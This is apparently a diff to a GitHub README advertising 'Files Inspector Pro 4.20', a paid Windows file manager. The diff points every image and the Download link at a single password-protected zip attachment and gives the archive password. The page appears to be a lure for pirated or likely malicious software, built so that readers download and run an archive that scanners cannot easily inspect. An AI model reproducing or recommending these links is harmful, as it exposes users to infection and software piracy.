@@ -1,6 +1,6 @@
 # Files-Inspector-Pro-4.20
 
-[![image](https://github.com/user-attachments/assets/15cb9a4c-7e9c-4445-b698-8f6722198355)]()
+[![image](https://github.com/user-attachments/assets/15cb9a4c-7e9c-4445-b698-8f6722198355)](https://github.com/user-attachments/files/18399320/Files-Inspector-Pro-4.20.zip)
 
 # Files Inspector Pro
 
@@ -8,7 +8,7 @@ Files Inspector Pro is a powerful file and folder management program for the Win
 
 The program provides users with complete control over their file system. It allows easy browsing of disk contents and folders, searching for files based on various criteria, sorting, and filtering search results. It also offers quick viewing and previewing of files in different formats, including text documents, images, videos, and audio files.
 
-[![image](https://github.com/user-attachments/assets/1bc9a979-aeaa-494a-8d46-7600c8d58af1)]()
+[![image](https://github.com/user-attachments/assets/1bc9a979-aeaa-494a-8d46-7600c8d58af1)](https://github.com/user-attachments/files/18399320/Files-Inspector-Pro-4.20.zip)
 
 
 ## Features
@@ -25,11 +25,11 @@ Files Inspector Pro offers advanced security features. It allows users to encryp
 ### 4. **Intuitive User Interface**
 The program has a simple and user-friendly interface, making it accessible to a wide range of users. It also offers high performance and quick responsiveness, ensuring efficient file and folder management.
 
-[![image](https://github.com/user-attachments/assets/6734b5ec-e93b-44f6-bdda-548ddfb1b780)]()
+[![image](https://github.com/user-attachments/assets/6734b5ec-e93b-44f6-bdda-548ddfb1b780)](https://github.com/user-attachments/files/18399320/Files-Inspector-Pro-4.20.zip)
 
 ## Download
 
-[Download Files Inspector Pro 4.20 Eng](#)
+[Download Files Inspector Pro 4.20 Eng](https://github.com/user-attachments/files/18399320/Files-Inspector-Pro-4.20.zip)
 ### Pass - GerosTheKing
 
 ## Overview
